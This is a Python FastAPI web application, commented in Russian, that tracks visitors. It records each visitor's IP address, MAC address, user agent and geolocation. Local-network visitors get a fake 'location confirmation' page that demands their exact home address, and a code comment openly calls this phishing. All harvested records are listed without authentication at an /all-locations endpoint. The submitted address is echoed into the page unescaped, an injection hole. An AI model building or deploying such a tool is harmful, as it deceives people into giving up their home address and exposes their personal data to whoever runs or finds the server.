from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
import subprocess
import re
import socket
import requests
from datetime import datetime

app = FastAPI()

# Кэш для хранения данных
location_cache = {}


def get_mac(ip: str) -> str:
    """Получаем MAC-адрес"""
    try:
        cmd = ["arp", "-n", ip] if subprocess.os.name != "nt" else ["arp", "-a", ip]
        output = subprocess.check_output(cmd).decode(errors="ignore")
        mac = re.search(r"(([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}", output)
        return mac.group(0) if mac else "Неизвестно"
    except:
        return "Ошибка"


def get_approximate_location(ip: str) -> dict:
    """Определяем приблизительное местоположение"""
    # Для публичных IP используем API
    if not ip.startswith(('10.', '192.168.', '172.')):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,lat,lon")
            return response.json()
        except:
            pass

    # Для локальных IP используем кэш и фишинг
    return {
        "status": "Требуется подтверждение",
        "country": "?",
        "city": "?",
        "isp": "Локальная сеть",
        "lat": 0,
        "lon": 0
    }


@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    """Главная страница с определением местоположения"""
    client_ip = request.client.host
    mac = get_mac(client_ip)

    # Получаем или создаем запись о местоположении
    if client_ip not in location_cache:
        location = get_approximate_location(client_ip)
        location_cache[client_ip] = {
            "ip": client_ip,
            "mac": mac,
            "location": location,
            "last_seen": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_agent": request.headers.get("user-agent")
        }

    data = location_cache[client_ip]

    # Показываем разные страницы в зависимости от статуса
    if data["location"].get("status") == "Требуется подтверждение":
        return HTMLResponse(f"""
        <html>
        <head><title>Подтверждение местоположения</title></head>
        <body style="font-family: Arial; padding: 20px;">
            <h2>🔒 Требуется подтверждение местоположения</h2>
            <p>Для доступа к ресурсу нам необходимо подтвердить ваш регион.</p>

            <div style="background: #f0f0f0; padding: 15px; border-radius: 5px;">
                <p>Ваше устройство:</p>
                <ul>
                    <li>IP: {data['ip']}</li>
                    <li>MAC: {data['mac']}</li>
                    <li>Время подключения: {data['last_seen']}</li>
                </ul>
            </div>

            <form method="post" style="margin-top: 20px;">
                <label>Ваш точный адрес проживания:</label><br>
                <input type="text" name="address" required style="width: 300px; padding: 8px;"><br>
                <button type="submit" style="margin-top: 10px; padding: 8px 15px;">Подтвердить</button>
            </form>
        </body>
        </html>
        """)

    # Если местоположение известно
    return HTMLResponse(f"""
    <html>
    <head><title>Ваше местоположение</title></head>
    <body style="font-family: Arial; padding: 20px;">
        <h1>🌍 Ваше местоположение</h1>

        <div style="background: #e0f7fa; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
            <h3>📍 {data['location'].get('city', 'Неизвестно')}, {data['location'].get('country', 'Неизвестно')}</h3>
            <p>Координаты: {data['location'].get('lat', '?')}, {data['location'].get('lon', '?')}</p>
            <p>Провайдер: {data['location'].get('isp', 'Неизвестно')}</p>
        </div>

        <div style="background: #f5f5f5; padding: 15px; border-radius: 5px;">
            <p>Техническая информация:</p>
            <ul>
                <li>IP: {data['ip']}</li>
                <li>MAC: {data['mac']}</li>
                <li>Последняя активность: {data['last_seen']}</li>
                <li>Устройство: {data['user_agent']}</li>
            </ul>
        </div>
    </body>
    </html>
    """)


@app.post("/", response_class=HTMLResponse)
async def save_location(request: Request, address: str = Form(...)):
    """Сохраняем введенный адрес"""
    client_ip = request.client.host
    mac = get_mac(client_ip)

    # Обновляем данные
    location_cache[client_ip] = {
        "ip": client_ip,
        "mac": mac,
        "location": {
            "status": "success",
            "country": "Россия",  # Предположение
            "city": address.split(',')[0] if ',' in address else "Неизвестно",
            "address": address,
            "lat": "Приблизительно",
            "lon": "Приблизительно"
        },
        "last_seen": datetime.now().strftime("%d.%m.%Y %H:%M"),
        "user_agent": request.headers.get("user-agent")
    }

    return HTMLResponse(f"""
    <html>
    <head><title>Подтверждено</title></head>
    <body style="font-family: Arial; padding: 20px;">
        <h2>✅ Местоположение подтверждено!</h2>
        <p>Ваш адрес: <strong>{address}</strong></p>
        <p><a href="/">Вернуться на главную</a></p>
    </body>
    </html>
    """)


@app.get("/all-locations")
async def show_all():
    """Показать все собранные данные"""
    return location_cache


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)